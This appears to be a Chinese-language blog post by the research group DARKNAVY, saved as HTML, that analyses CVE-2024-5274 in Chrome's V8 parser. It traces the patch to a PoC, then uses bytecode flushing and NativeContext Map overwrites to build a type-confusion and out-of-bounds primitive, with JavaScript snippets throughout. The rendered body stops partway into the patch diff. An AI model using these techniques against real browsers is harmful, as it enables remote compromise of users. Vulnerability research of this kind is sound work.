<!doctype html><html lang=zh dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes | DARKNAVY</title>
<meta name=keywords content><meta name=description content="在今年5月，我们注意到Chrome在一次更新中修复了一个被在野利用的V8漏洞，我们迅速定位了这个漏洞的修复，发现他是近些年来罕见的Parser模块的漏洞，这引起了我们很大的兴趣，于是有了以下的研究。
从patch到PoC 首先我们看一下此漏洞的patch：
diff --git a/src/ast/scopes.cc b/src/ast/scopes.cc index 660fdd2e9ad..de4df35c0ad 100644 --- a/src/ast/scopes.cc +++ b/src/ast/scopes.cc @@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) { var->set_is_used(); if (inner_scope_calls_eval_ && !var->is_this()) var->SetMaybeAssigned(); } - DCHECK(!var->has_forced_context_allocation() || var->is_used()); + CHECK(!var->has_forced_context_allocation() || var->is_used()); // Global variables do not need to be allocated. return !var->IsGlobalObjectProperty() && var->is_used(); } diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h index 40914d39a4f..65c338f343f 100644 --- a/src/parsing/parser-base.h +++ b/src/parsing/parser-base.h @@ -2661,6 +2661,7 @@ typename ParserBase<Impl>::BlockT ParserBase<Impl>::ParseClassStaticBlock( } FunctionState initializer_state(&amp;function_state_, &amp;scope_, initializer_scope); + FunctionParsingScope body_parsing_scope(impl()); AcceptINScope accept_in(this, true); // Each static block has its own var and lexical scope, so make a new var patch十分简单，实际真正有效的修复代码仅有一行，在解析class的static initialization block时新增了一个类型为FunctionParsingScope的变量，我们再看一下这个新增的变量做了什么："><meta name=author content="DARKNAVY"><link rel=canonical href=https://www.darknavy.org/zh/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/><link crossorigin=anonymous href=/assets/css/stylesheet.38a584f0fc0f77186c8518d4117588a5b01cffe28707e993a6ae5cd5e2b0c5d0.css integrity="sha256-OKWE8PwPdxhshRjUEXWIpbAc/+KHB+mTpq5c1eKwxdA=" rel="preload stylesheet" as=style><link rel=icon href=https://www.darknavy.org/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.darknavy.org/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.darknavy.org/favicon-32x32.png><link rel=apple-touch-icon href=https://www.darknavy.org/apple-touch-icon.png><link rel=mask-icon href=https://www.darknavy.org/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://www.darknavy.org/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/><link rel=alternate hreflang=zh href=https://www.darknavy.org/zh/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-LR4ZN1LSPS"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-LR4ZN1LSPS")}</script><meta property="og:title" content="CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes"><meta property="og:description" content="在今年5月，我们注意到Chrome在一次更新中修复了一个被在野利用的V8漏洞，我们迅速定位了这个漏洞的修复，发现他是近些年来罕见的Parser模块的漏洞，这引起了我们很大的兴趣，于是有了以下的研究。
从patch到PoC 首先我们看一下此漏洞的patch：
diff --git a/src/ast/scopes.cc b/src/ast/scopes.cc index 660fdd2e9ad..de4df35c0ad 100644 --- a/src/ast/scopes.cc +++ b/src/ast/scopes.cc @@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) { var->set_is_used(); if (inner_scope_calls_eval_ && !var->is_this()) var->SetMaybeAssigned(); } - DCHECK(!var->has_forced_context_allocation() || var->is_used()); + CHECK(!var->has_forced_context_allocation() || var->is_used()); // Global variables do not need to be allocated. return !var->IsGlobalObjectProperty() && var->is_used(); } diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h index 40914d39a4f..65c338f343f 100644 --- a/src/parsing/parser-base.h +++ b/src/parsing/parser-base.h @@ -2661,6 +2661,7 @@ typename ParserBase<Impl>::BlockT ParserBase<Impl>::ParseClassStaticBlock( } FunctionState initializer_state(&amp;function_state_, &amp;scope_, initializer_scope); + FunctionParsingScope body_parsing_scope(impl()); AcceptINScope accept_in(this, true); // Each static block has its own var and lexical scope, so make a new var patch十分简单，实际真正有效的修复代码仅有一行，在解析class的static initialization block时新增了一个类型为FunctionParsingScope的变量，我们再看一下这个新增的变量做了什么："><meta property="og:type" content="article"><meta property="og:url" content="https://www.darknavy.org/zh/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/"><meta property="og:image" content="https://www.darknavy.org/images/white_logo.png"><meta property="article:section" content="blog"><meta property="article:published_time" content="2024-08-30T10:09:29+08:00"><meta property="article:modified_time" content="2024-08-30T10:09:29+08:00"><meta property="og:site_name" content="DARKNAVY"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.darknavy.org/images/white_logo.png"><meta name=twitter:title content="CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes"><meta name=twitter:description content="在今年5月，我们注意到Chrome在一次更新中修复了一个被在野利用的V8漏洞，我们迅速定位了这个漏洞的修复，发现他是近些年来罕见的Parser模块的漏洞，这引起了我们很大的兴趣，于是有了以下的研究。
从patch到PoC 首先我们看一下此漏洞的patch：
diff --git a/src/ast/scopes.cc b/src/ast/scopes.cc index 660fdd2e9ad..de4df35c0ad 100644 --- a/src/ast/scopes.cc +++ b/src/ast/scopes.cc @@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) { var->set_is_used(); if (inner_scope_calls_eval_ && !var->is_this()) var->SetMaybeAssigned(); } - DCHECK(!var->has_forced_context_allocation() || var->is_used()); + CHECK(!var->has_forced_context_allocation() || var->is_used()); // Global variables do not need to be allocated. return !var->IsGlobalObjectProperty() && var->is_used(); } diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h index 40914d39a4f..65c338f343f 100644 --- a/src/parsing/parser-base.h +++ b/src/parsing/parser-base.h @@ -2661,6 +2661,7 @@ typename ParserBase<Impl>::BlockT ParserBase<Impl>::ParseClassStaticBlock( } FunctionState initializer_state(&amp;function_state_, &amp;scope_, initializer_scope); + FunctionParsingScope body_parsing_scope(impl()); AcceptINScope accept_in(this, true); // Each static block has its own var and lexical scope, so make a new var patch十分简单，实际真正有效的修复代码仅有一行，在解析class的static initialization block时新增了一个类型为FunctionParsingScope的变量，我们再看一下这个新增的变量做了什么："><meta name=twitter:site content="@DarkNavyOrg"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"博客","item":"https://www.darknavy.org/zh/blog/"},{"@type":"ListItem","position":2,"name":"CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes","item":"https://www.darknavy.org/zh/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes","name":"CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes","description":"在今年5月，我们注意到Chrome在一次更新中修复了一个被在野利用的V8漏洞，我们迅速定位了这个漏洞的修复，发现他是近些年来罕见的Parser模块的漏洞，这引起了我们很大的兴趣，于是有了以下的研究。\n从patch到PoC 首先我们看一下此漏洞的patch：\ndiff --git a/src/ast/scopes.cc b/src/ast/scopes.cc index 660fdd2e9ad..de4df35c0ad 100644 --- a/src/ast/scopes.cc +++ b/src/ast/scopes.cc @@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) { var-\u0026gt;set_is_used(); if (inner_scope_calls_eval_ \u0026amp;\u0026amp; !var-\u0026gt;is_this()) var-\u0026gt;SetMaybeAssigned(); } - DCHECK(!var-\u0026gt;has_forced_context_allocation() || var-\u0026gt;is_used()); + CHECK(!var-\u0026gt;has_forced_context_allocation() || var-\u0026gt;is_used()); // Global variables do not need to be allocated. return !var-\u0026gt;IsGlobalObjectProperty() \u0026amp;\u0026amp; var-\u0026gt;is_used(); } diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h index 40914d39a4f..65c338f343f 100644 --- a/src/parsing/parser-base.h +++ b/src/parsing/parser-base.h @@ -2661,6 +2661,7 @@ typename ParserBase\u0026lt;Impl\u0026gt;::BlockT ParserBase\u0026lt;Impl\u0026gt;::ParseClassStaticBlock( } FunctionState initializer_state(\u0026amp;function_state_, \u0026amp;scope_, initializer_scope); + FunctionParsingScope body_parsing_scope(impl()); AcceptINScope accept_in(this, true); // Each static block has its own var and lexical scope, so make a new var patch十分简单，实际真正有效的修复代码仅有一行，在解析class的static initialization block时新增了一个类型为FunctionParsingScope的变量，我们再看一下这个新增的变量做了什么：","keywords":[],"articleBody":"在今年5月，我们注意到Chrome在一次更新中修复了一个被在野利用的V8漏洞，我们迅速定位了这个漏洞的修复，发现他是近些年来罕见的Parser模块的漏洞，这引起了我们很大的兴趣，于是有了以下的研究。\n从patch到PoC 首先我们看一下此漏洞的patch：\ndiff --git a/src/ast/scopes.cc b/src/ast/scopes.cc index 660fdd2e9ad..de4df35c0ad 100644 --- a/src/ast/scopes.cc +++ b/src/ast/scopes.cc @@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) { var-\u003eset_is_used(); if (inner_scope_calls_eval_ \u0026\u0026 !var-\u003eis_this()) var-\u003eSetMaybeAssigned(); } - DCHECK(!var-\u003ehas_forced_context_allocation() || var-\u003eis_used()); + CHECK(!var-\u003ehas_forced_context_allocation() || var-\u003eis_used()); // Global variables do not need to be allocated. return !var-\u003eIsGlobalObjectProperty() \u0026\u0026 var-\u003eis_used(); } diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h index 40914d39a4f..65c338f343f 100644 --- a/src/parsing/parser-base.h +++ b/src/parsing/parser-base.h @@ -2661,6 +2661,7 @@ typename ParserBase::BlockT ParserBase::ParseClassStaticBlock( } FunctionState initializer_state(\u0026function_state_, \u0026scope_, initializer_scope); + FunctionParsingScope body_parsing_scope(impl()); AcceptINScope accept_in(this, true); // Each static block has its own var and lexical scope, so make a new var patch十分简单，实际真正有效的修复代码仅有一行，在解析class的static initialization block时新增了一个类型为FunctionParsingScope的变量，我们再看一下这个新增的变量做了什么：\nclass V8_NODISCARD FunctionParsingScope { public: explicit FunctionParsingScope(Impl* parser) : parser_(parser), expression_scope_(parser_-\u003eexpression_scope_) { parser_-\u003eexpression_scope_ = nullptr; } ~FunctionParsingScope() { parser_-\u003eexpression_scope_ = expression_scope_; } private: Impl* parser_; ExpressionScope* expression_scope_; }; 这是一个极为简单的类，他所做的事情就是在构造时把当前parser_中的expression_scope_暂存起来，再在析构的时候将其恢复。那么重点就是这个ExpressionScope了。\nparser在语法分析阶段，会将脚本中的不同部分分为不同的Scope，简单理解下Scope划分了变量的作用范围，JavaScript中有许多不同的Scope类型，如Global scope/Module scope/Function scope等等。\n为了更好地解析变量所在的不同Scope，开发者引入了ExpressionScope的概念，其具体概念可以参考这篇官方文档。值得一提的是，v8中的ExpressionScope和Scope在命名上很相似，实际是完全不同的概念，ExpressionScope是一个中间变量，他的存在是为了方便解析，用来生成实际AST中的Scope。Scope和ExpressionScope一样，通过parent来逐级索引外层。\n回到此漏洞，新增的FunctionParsingScope变量阻断了ExpressionScope链向parent索引，那么原漏洞很可能是导致了parent ExpressionScope的非预期行为，寻找parent的引用，几乎只有这个函数是可能的嫌疑犯：\nvoid RecordThisUse() { ExpressionScope* scope = this; do { if (scope-\u003eIsArrowHeadParsingScope()) { scope-\u003eAsArrowHeadParsingScope()-\u003eRecordThisUse(); } scope = scope-\u003eparent(); } while (scope != nullptr); } 再查看此函数的调用处：\n// Needs to be called if the reference needs to be available from the current // point. It causes the receiver to be context allocated if necessary. // Returns the receiver variable that we're referencing. V8_INLINE Variable* UseThis() { // ... var-\u003eset_is_used(); if (closure_scope == receiver_scope) { // It's possible that we're parsing the head of an arrow function, in // which case we haven't realized yet that closure_scope != // receiver_scope. Mark through the ExpressionScope for now. expression_scope()-\u003eRecordThisUse(); } else { // ... } 这个函数在处理JavaScript中的一个特殊变量this，在传统的function中，this变量不能在函数调用间传递，如：\nfunction showThis() { function innerThis() { return this; } console.log(this == innerThis()); } let obj = {}; obj.showThis = showThis; obj.showThis(); // output: false 而在ES6中引入的箭头函数解决了这一问题，箭头函数内可以正常使用外层的this变量。为了支持此特性，对于this的parsing就会需要特殊处理。正如UseThis函数中的注释所说，当v8发现出现this变量时，若内外的Scope为同一个，有可能是正在解析箭头函数的参数部分，如以下代码所示：\nfunction foo() { (arg = this.a) =\u003e { console.log(arg); } } 由于此时箭头函数的Scope并未分配，因此需要用ExpressionScope来标记此处使用了this变量，以便后面分配Scope时能正确分配出this变量。在RecordThisUse中，函数将所有parent ExpressionScope都标记为使用了this。\n那么回想this的传递，他应当在函数的调用过程中被阻断，而class的static block同样应当被视为一个函数block，所以此处的问题就为：在class static block中使用this，通过ExpressionScope链传递，会错误地将外层的函数标记为使用了this。PoC如下：\nfunction f1() { (arg = class AAA { static { this; } }) =\u003e { } } f1(); 由于外层函数f1的this并未被使用，但是被标记为了has_forced_context_allocation，因此在分配该变量时会触发DCHECK。\n构造字节码不一致 这样一个微小的错误能够引起v8引擎什么样的混乱呢？接下来我们继续深入研究生成的字节码。\n构造以下函数：\nfunction f1() { function foo() { } (arg = class AAA { static { this; } }) =\u003e { } } 在新版修复漏洞后生成的字节码：\n[generated bytecode for function: f1 (0x234800198559 )] Bytecode length: 6 Parameter count 1 Register count 0 Frame size 0 40 S\u003e 0xee0000400a4 @ 0 : 85 00 00 02 CreateClosure [0], [0], #2 0xee0000400a8 @ 4 : 0e LdaUndefined 102 S\u003e 0xee0000400a9 @ 5 : af Return Constant pool (size = 1) 0xee000040071: [TrustedFixedArray] - map: 0x234800000595 - length: 1 0: 0x2348001986a1 旧版下有问题的字节码：\n[generated bytecode for function: f1 (0x0e2b0019ab81 )] Bytecode length: 15 Parameter count 1 Register count 1 Frame size 8 Bytecode age: 0 19 E\u003e 0xe2b0019adc2 @ 0 : 84 00 01 CreateFunctionContext [0], [1] 0xe2b0019adc5 @ 3 : 1a fa PushContext r0 0xe2b0019adc7 @ 5 : 0b 02 Ldar 0xe2b0019adc9 @ 7 : 25 02 StaCurrentContextSlot [2] 63 S\u003e 0xe2b0019adcb @ 9 : 81 01 00 02 CreateClosure [1], [0], #2 0xe2b0019adcf @ 13 : 0e LdaUndefined 155 S\u003e 0xe2b0019add0 @ 14 : aa Return Constant pool (size = 2) 0xe2b0019ad91: [FixedArray] in OldSpace - map: 0x0e2b00000089 - length: 2 0: 0x0e2b0019ad2d 1: 0x0e2b0019ad5d 正如前一节所述，即使在函数f1中没有使用this，在字节码中仍然强制分配了this变量。具体解释其字节码：\nCreateFunctionContext创建了一个函数的Context PushContext将当前的Context替换为新创建的，保存旧Context Ldar读取this到accumulator StaCurrentContextSlot将accumulator中的值存储到当前Context的slot 2中 然而我们的目标是在一次脚本执行内字节码发生不一致，这样才有利用的可能。学习了CVE-2022-4262的PoC和分析，或许利用Bytecode flushing机制是个不错的主意。v8中若一个函数在多次GC后仍未被使用，该函数的bytecode就会被回收。而再次执行时，parser会使用之前已存储的结果来更快地生成bytecode。例如在parse箭头函数的头部时，第一次生成bytecode时parser不知道是在处理变量赋值还是箭头函数参数声明，而在之后的处理则可以确定是箭头函数头部。\n有了这个基础知识，我们主动触发Bytecode flushing，成功构造出了两次执行的字节码不一致：\nf1(); flush_bytecode(); f1(); 函数f1在flush后的字节码和漏洞修复后的字节码一致，即少了构造Function Context的四条字节码指令。\n失败的尝试记录 此节并不影响后续内容阅读，读者可直接阅读下一节。\n实际上我们的研究并非一帆风顺，在构造出实际有用的不一致前，我们花费了大量时间尝试另一种字节码不一致。\n最开始观察错误的字节码，其本质上是在Function Context内存储了一个多余的this，那么第一个到脑中的想法就是：如果在Function Context还有其他的变量，那么由于两次字节码不一致，若内部函数使用了同样的slot index来访问变量，可能会发生一些非预期的行为。\n带着这个想法，构造了以下PoC:\nfunction f1() { let a0 = 0, a1 = 1; function f2() { console.log('a0 = ' + a0); console.log('a1 = ' + a1); } function hax() { a0 = 0x1337; } (arg = class AAA { static { this; } }) =\u003e { } hax(); f2(); return hax; } // keep a reference to hax to make it consistent after flushing let hax = f1(); flush_bytecode(); console.log('after flush'); f1(); 输出结果为：\na0 = 4919 a1 = 1 after flush a0 = 0 a1 = 4919 可以看到，在第二次执行时，即便代码中赋值的对象是a0，但实际上被修改的是a1。查看函数hax的字节码：\n[generated bytecode for function: hax (0x2e72000db2ed )] Bytecode length: 15 Parameter count 1 Register count 1 Frame size 8 Bytecode age: 0 763 S\u003e 0x2e72000dc35e @ 0 : 00 0d 37 13 LdaSmi.Wide [4919] 0x2e72000dc362 @ 4 : c5 Star0 0x2e72000dc363 @ 5 : 16 03 LdaCurrentContextSlot [3] 766 E\u003e 0x2e72000dc365 @ 7 : ab 00 ThrowReferenceErrorIfHole [0] 0x2e72000dc367 @ 9 : 0b fa Ldar r0 0x2e72000dc369 @ 11 : 25 03 StaCurrentContextSlot [3] 0x2e72000dc36b @ 13 : 0e LdaUndefined 778 S\u003e 0x2e72000dc36c @ 14 : aa Return Constant pool (size = 1) 0x2e72000dc331: [FixedArray] in OldSpace - map: 0x2e7200000089 - length: 1 0: 0x2e72000dad51 两次生成的hax字节码一样，均从当前Context的slot 3中读取变量。在第一次执行时这是没有问题的，因为this被存储在slot 2中，a0存储在slot 3中，而在第二次执行时，v8为f1生成了正确的字节码，此时a0在slot 2，a1在slot 3中，hax的字节码没有正确更新，就出现了上面这样非预期的结果。\n我们试图利用这个bug，导致更进一步的type confusion。尝试了以下手段均以失败告终：\n尝试利用JIT优化对a0的访问，再在触发漏洞后使用JIT后的函数访问a1。然而此法不通，实际上字节码层面的变量修改对于JIT引擎来说都是可见的。 尝试使用非预期的字节码访问另一个变量，即以下场景：字节码Foo只接受类型A的参数，在使用类型B的参数时会发生类型混淆。然而字节码作为较为高层的存在，都会校验输入参数的类型，并不存在我们想要的字节码。 利用字节码不一致 另一种非预期行为 我们观察两次生成的字节码，区别在于有没有Function Context。研究字节码可以发现，对于Context的load有两种方式，分别是LdaCurrentContextSlot和LdaContextSlot。\n// comments from src/interpreter/interpreter-generator.cc LdaCurrentContextSlot \u003cslot_index\u003e Load the object in |slot_index| of the current context into the accumulator. LdaContextSlot \u003ccontext\u003e \u003cslot_index\u003e \u003cdepth\u003e Load the object in |slot_index| of the context at |depth| in the context chain starting at |context| into the accumulator. 很显然，LdaContextSlot更为复杂。因为context的存储是栈式的，LdaContextSlot给予了一个更通用的方式来load，可以手动置顶起始context和需要查找的depth。\n例如，以下字节码则是一个常见的字节码组合来load一个值。\n2807 S\u003e 0x1541001a24ba @ 0 : 14 ff 70 01 LdaContextSlot , [10], [1] 0x1541001a24be @ 4 : ab 00 ThrowReferenceErrorIfHole [0] 0x1541001a24c0 @ 6 : c5 Star0 回想两次生成的字节码的不同，那么一个新想法就是：如果在第二次生成字节码时，没有创建新的Function Context，而在内部函数LdaContextSlot时保持了旧的深度，那么会发生什么？\nlet o0; function f1() { function hax() { %DebugPrint(o0); } // ... } 函数hax的字节码如下：\n[generated bytecode for function: hax (0x00f9000de775 )] Bytecode length: 14 Parameter count 1 Register count 1 Frame size 8 Bytecode age: 0 2602 S\u003e 0xf9000e1256 @ 0 : 14 ff 02 01 LdaContextSlot , [2], [1] 0xf9000e125a @ 4 : ab 00 ThrowReferenceErrorIfHole [0] 0xf9000e125c @ 6 : c5 Star0 0xf9000e125d @ 7 : 65 aa 01 fa 01 CallRuntime [DebugPrint], r0-r0 0xf9000e1262 @ 12 : 0e LdaUndefined 2621 S\u003e 0xf9000e1263 @ 13 : aa Return Constant pool (size = 1) 0xf9000e1229: [FixedArray] in OldSpace - map: 0x00f900000089 - length: 1 0: 0x00f9000dad2d 输出的结果令人吃惊：\nDebugPrint: 0xf9000d4089: [JSGlobalObject] in OldSpace - map: 0x00f9000d8395 \u003cMap[20](HOLEY_ELEMENTS)\u003e [DictionaryProperties] - prototype: 0x00f900092b7d \u003cObject map = 0xf9000d46a5\u003e - elements: 0x00f900000219 \u003cFixedArray[0]\u003e [HOLEY_ELEMENTS] - native context: 0x00f9000c3c2d \u003cNativeContext[281]\u003e - global proxy: 0x00f9000c3bf5 \u003cJSGlobalProxy\u003e - properties: 0x00f9000e0bbd \u003cGlobalDictionary[261]\u003e - All own properties (excluding elements): { Uint8Array: 0x00f9000c5be1 \u003cJSFunction Uint8Array (sfi = 0xf90008c131)\u003e (data, dict_index: 30, attrs: [W_C]) ... 这个JSGlobalObject到底从何而来？\n答案是他来自于NativeContext，原来由于我们跳过了一层Function Context，我们load到了预期Context的更外面一层，而这一层的Context就是NativeContext。\n我们稍微修改一下脚本，dump出NativeContext中的所有对象:\nlet o0, o1, o2, o3, ... function f1() { function hax() { %DebugPrint(o0); %DebugPrint(o1); %DebugPrint(o2); // ... } // ... 这些对象对应的源码在这里，我们dump出的结果也已公开。\nNativeContext的玩法 至此我们可以任意地访问NativeContext中的对象，里面有许多在正常JavaScript执行过程中无法获取到的对象。例如我们可以直接访问到一个double类型的array中的FixedDoubleArray（实际存储元素的结构）。\n// o155 in slot 157 DebugPrint: 0x272f000d1ba1: [FixedDoubleArray] in OldSpace - map: 0x272f0000090d \u003cMap(FIXED_DOUBLE_ARRAY_TYPE)\u003e - length: 64 0-63: 0 0x272f0000090d: [Map] in ReadOnlySpace - type: FIXED_DOUBLE_ARRAY_TYPE - instance size: variable - elements kind: HOLEY_DOUBLE_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x272f00000251 \u003cundefined\u003e - prototype_validity cell: 0 - instance descriptors (own) #0: 0x272f00000295 \u003cDescriptorArray[0]\u003e - prototype: 0x272f00000235 \u003cnull\u003e - constructor: 0x272f00000235 \u003cnull\u003e - dependent code: 0x272f00000229 \u003cOther heap object (WEAK_ARRAY_LIST_TYPE)\u003e - construction counter: 0 然而，若我们试图去使用这个类型，会发生crash。\n这是因为这些类型并不能直接从JavaScript中操作，除了一些基本类型，基本上只有属于JSObject的类型才可被脚本操作。\n继续研究NativeContext中的其他Object，可以看到其中有大量Map类型的Object。\n// o151 in slot 153 DebugPrint: 0x272f000d1b39: [Map] in OldSpace - type: JS_MAP_KEY_VALUE_ITERATOR_TYPE - instance size: 20 - inobject properties: 0 - elements kind: HOLEY_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x272f00000251 \u003cundefined\u003e - prototype_validity cell: 0x272f00000ac5 \u003cCell value= 1\u003e - instance descriptors (own) #0: 0x272f00000295 \u003cDescriptorArray[0]\u003e - prototype: 0x272f000d1251 \u003cObject map = 0x272f000d11e5\u003e - constructor: 0x272f000d1b19 \u003cJSFunction MapIterator (sfi = 0x272f00091e29)\u003e - dependent code: 0x272f00000229 \u003cOther heap object (WEAK_ARRAY_LIST_TYPE)\u003e - construction counter: 0 ... Map是v8中一个基础且重要的类型，他决定了一个变量的类型。如果有办法操作Map，那就能够造出一个强大的漏洞利用原语Type Confusion。\n在某些情况下，v8会从NativeContext中读取Map来创建对象。例如在src/builtins/promise-all.tq中：\nconst arrayMap = *NativeContextSlot( nativeContext, ContextSlot::JS_ARRAY_PACKED_ELEMENTS_MAP_INDEX); // ... const valuesArray = NewJSArray(arrayMap, values); 我们虽然不能直接修改Map对象，但是NativeContext中有大量的Map，如果我们从某个slot读取一个Map覆盖了另一个slot中的Map，那么是否就造成了类型混淆呢？答案是肯定的！\n以下代码就是一个简单的PoC:\nfunction f1() { function hax() { // o60 is JS_ARGUMENTS_OBJECT_TYPE map with FAST_SLOPPY_ARGUMENTS_ELEMENTS // o110 is JS_ARRAY_TYPE map with PACKED_DOUBLE_ELEMENTS o60 = o110; } // ... } // ... function hax2(a0) { // `arguments` is confused to double array now %DebugPrint(arguments); } hax2(); 在PoC中我们将函数的arguments混淆成了元素为double的array，可以造成OOB读写。通过完成这样类型混淆的方式，接下来就是经典的v8漏洞利用套路了。相关的PoC代码和全部的native objects定义我们已公开在了我们的Github仓库中。\n至此我们终于通过parser中一个不起眼的小问题，完成了强大的漏洞利用原语，几乎可以任意地混淆JavaScript引擎中的不同类型。\n","wordCount":"1238","inLanguage":"zh","image":"https://www.darknavy.org/images/white_logo.png","datePublished":"2024-08-30T10:09:29+08:00","dateModified":"2024-08-30T10:09:29+08:00","author":{"@type":"Person","name":"DARKNAVY"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.darknavy.org/zh/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/"},"publisher":{"@type":"Organization","name":"DARKNAVY","logo":{"@type":"ImageObject","url":"https://www.darknavy.org/images/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://www.darknavy.org/zh/ accesskey=h title="  (Alt + H)"><img src=https://www.darknavy.org/images/darknavy_shenlan_dot.png alt aria-label=logo height=20></a><div class=logo-switches><ul class=lang-switch><li>|</li><li><a href=https://www.darknavy.org/ title=English aria-label=English>En</a></li></ul></div></div><ul id=menu><li><a href=https://www.darknavy.org/zh/ title=Home><span>Home</span></a></li><li><a href=https://www.darknavy.org/zh/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://www.darknavy.org/zh/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://www.darknavy.org/zh/>主页</a>&nbsp;»&nbsp;<a href=https://www.darknavy.org/zh/blog/>博客</a></div><h1 class="post-title entry-hint-parent">CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes</h1><div class=post-meta><span title='2024-08-30 10:09:29 +0800 CST'>八月 30, 2024</span>&nbsp;·&nbsp;1238 字&nbsp;·&nbsp;DARKNAVY&nbsp;|&nbsp;语言:<ul class=i18n_list><li><a href=https://www.darknavy.org/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/>En</a></li></ul></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#从patch到poc>从patch到PoC</a></li><li><a href=#构造字节码不一致>构造字节码不一致</a></li><li><a href=#失败的尝试记录>失败的尝试记录</a></li><li><a href=#利用字节码不一致>利用字节码不一致</a><ul><li><a href=#另一种非预期行为>另一种非预期行为</a></li><li><a href=#nativecontext的玩法>NativeContext的玩法</a></li></ul></li></ul></nav></div></details></div><div class=post-content><p>在今年5月，我们注意到Chrome在<a href=https://chromereleases.googleblog.com/2024/05/stable-channel-update-for-desktop_23.html>一次更新</a>中修复了一个被在野利用的V8漏洞，我们迅速定位了这个漏洞的修复，发现他是近些年来罕见的Parser模块的漏洞，这引起了我们很大的兴趣，于是有了以下的研究。</p><h2 id=从patch到poc>从patch到PoC<a hidden class=anchor aria-hidden=true href=#从patch到poc>#</a></h2><p>首先我们看一下此漏洞的<a href=https://chromium-review.googlesource.com/c/v8/v8/+/5553030>patch</a>：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gh>diff --git a/src/ast/scopes.cc b/src/ast/scopes.cc
</span></span></span><span class=line><span class=cl><span class=gh>index 660fdd2e9ad..de4df35c0ad 100644
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gd>--- a/src/ast/scopes.cc
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+++ b/src/ast/scopes.cc
</span></span></span><span class=line><span class=cl><span class=gi></span><span class=gu>@@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) {
</span></span></span><span class=line><span class=cl><span class=gu></span>     var-&gt;set_is_used();
</span></span><span class=line><span class=cl>     if (inner_scope_calls_eval_ &amp;&amp; !var-&gt;is_this()) var-&gt;SetMaybeAssigned();
</span></span><span class=line><span class=cl>   }
</span></span><span class=line><span class=cl><span class=gd>-  DCHECK(!var-&gt;has_forced_context_allocation() || var-&gt;is_used());
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+  CHECK(!var-&gt;has_forced_context_allocation() || var-&gt;is_used());
</span></span></span><span class=line><span class=cl><span class=gi></span>   // Global variables do not need to be allocated.
</span></span><span class=line><span class=cl>   return !var-&gt;IsGlobalObjectProperty() &amp;&amp; var-&gt;is_used();
</span></span><span class=line><span class=cl> }
</span></span><span class=line><span class=cl><span class=gh>diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
</span></span></span><span class=line><span class=cl><span class=gh>index 40914d39a4f..65c338f343f 100644
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gd>--- a/src/parsing/parser-base.h
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+++ b/src/parsing/parser-base.h
</span></span></span><span class=line><span class=cl><span class=gi></span><span class=gu>@@ -2661,6 +2661,7 @@ typename ParserBase&lt;Impl&gt;::BlockT ParserBase&lt;Impl&gt;::ParseClassStaticBlock(
</span></span></span><span class=line><span class=cl><span class=gu></span>   }
</span></span><span class=line><span class=cl>
